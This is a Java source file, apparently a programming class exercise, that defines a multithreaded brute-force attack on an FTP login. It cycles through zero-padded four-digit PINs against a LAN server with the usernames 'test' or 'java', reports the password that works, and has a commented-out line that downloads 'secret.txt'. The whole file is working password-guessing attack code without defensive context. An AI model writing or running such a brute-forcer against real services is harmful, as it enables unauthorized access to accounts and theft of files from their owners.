package day014;

import java.io.IOException;

import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPException;
import it.sauronsoftware.ftp4j.FTPIllegalReplyException;

public class Client extends Thread{
	public static boolean systemOut=false;
	private String password=null;
	private int start=0;
		Client(int start){
			this.start=start;
		}
	
	public void run(){
		String serverIP="192.168.150.7",serverID = "test";
//		String serverIP="192.168.50.65",serverID = "java";
//		String serverIP="192.168.50.14",serverID = "java";
		FTPClient client = new FTPClient();
		try {
			client.connect(serverIP,21);
		} catch (IllegalStateException | IOException | FTPIllegalReplyException | FTPException e1) {
			e1.printStackTrace();
		}
		for(int i=this.start;i<this.start+100;i++) {
			try {
				if(systemOut==true) {
					this.interrupt();
					return;
				}
				password=Integer.toString(i);
				switch(password.length()) {
				case 1:
					password="000"+password;
					break;
				case 2:
					password="00"+password;
					break;
				case 3:
					password="0"+password;
					break;
				default:
					break;
				}
				client.login(serverID, password);
				if(client.isPassive()==true) {
					System.out.println("암호 : "+password+" 접속성공");
//					client.download("secret.txt", new File("secret.txt"));	
					systemOut=true;
				}
			}catch(Exception e) {
				if(systemOut!=true)
					continue;
				else {
					this.interrupt();
					return;
				}
			}
		}
	}
}